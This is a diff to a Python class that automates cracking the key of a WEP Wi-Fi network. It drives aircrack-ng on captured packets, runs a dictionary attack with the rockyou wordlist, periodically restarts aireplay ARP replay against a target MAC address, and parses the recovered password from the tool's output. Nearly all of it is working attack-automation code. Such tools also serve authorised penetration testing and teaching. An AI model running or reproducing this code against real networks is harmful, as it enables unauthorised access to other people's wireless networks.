@@ -27,6 +27,7 @@ class WEP(EncryptionType):
         # super().__init__(self, network, interface)
         self.mac = mac
         self.running_with_wordlist = False
+        self.running_aircrack = False
 
     def scan_network(self):
         """
@@ -65,14 +66,12 @@ class WEP(EncryptionType):
         pgrep_aireplay_cmd = ['pgrep', 'aireplay']
 
         while self.password == "":
-            crack_thread = threading.Thread(target=self.crack_network)
-            crack_thread.start()
-            if not self.running_with_wordlist:
-                aircrack_wordlist_thread = threading.Thread(target=self.aircrack_wordlist)
-                aircrack_wordlist_thread.start()
-            time.sleep(10)
+            if not self.running_aircrack:
+                crack_thread = threading.Thread(target=self.crack_network)
+                crack_thread.start()
+            time.sleep(1)
             if not self.silent_attack and self.password == "":
-                if counter == 2:
+                if counter == 20:
                     self.show_message("Reseting aireplay every 20 seconds . . .")
                     pgrep_out, err = self.execute_command(pgrep_aireplay_cmd)
 
@@ -91,6 +90,11 @@ class WEP(EncryptionType):
                     arpreplay_thread.start()
                     arpreplay_thread.join(0)
                     self.show_message("Running aireplay thread on mac: " + self.mac)
+
+                    if not self.running_with_wordlist:
+                        aircrack_wordlist_thread = threading.Thread(target=self.aircrack_wordlist)
+                        aircrack_wordlist_thread.start()
+
                     counter = 0
                 else:
                     counter+=1
@@ -103,25 +107,41 @@ class WEP(EncryptionType):
 
         :Author: Miguel Yanes Fernández
         """
+        self.running_aircrack = True
+        self.execute_command(['rm', self.write_directory + '/aircrack_out_' + str(self.timestamp)])
+        self.execute_command(['touch', self.write_directory + '/aircrack_out_' + str(self.timestamp)])
         aircrack_cmd = ['timeout', '10', 'aircrack-ng',
                         self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap']
         self.show_message("Running aircrack thread")
         out, err = self.execute_command(aircrack_cmd)
-        print("out")
-        print(out)
-        print("end out")
-        password = self.filter_aircrack(out.decode("utf-8"))
+        password= self.filter_aircrack(out.decode("utf-8"))
+        self.running_aircrack = False
 
         self.password = password
 
     def aircrack_wordlist(self):
+        self.show_message("running with wordlist")
         self.running_with_wordlist = True
         aircrack_wordlist_cmd = ['aircrack-ng', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
                                  '-w', '/usr/share/wordlists/rockyou.txt']
         out, err = self.execute_command(aircrack_wordlist_cmd)
-        print("\n\tFinished with wordlist:")
-        print(out.decode("utf-8"))
+        self.show_message("\n\tFinished with wordlist")
         password = self.filter_aircrack(out.decode("utf-8"))
         self.password = password
 
         self.running_with_wordlist = False
+
+    def filter_aircrack(self, output):
+        """
+        Filter the aircrack output to read the password (if any is found)
+        :param output: output from the aicrack command
+        :return: password (or "" if it wasn't found)
+
+        :Author: Miguel Yanes Fernández
+        """
+        words = output.split(" ")
+        for i in range(0, len(words)):
+            if words[i] == "(ASCII:":
+                return words[i+1]
+        self.show_message("No password found in the capture file")
+        return ""
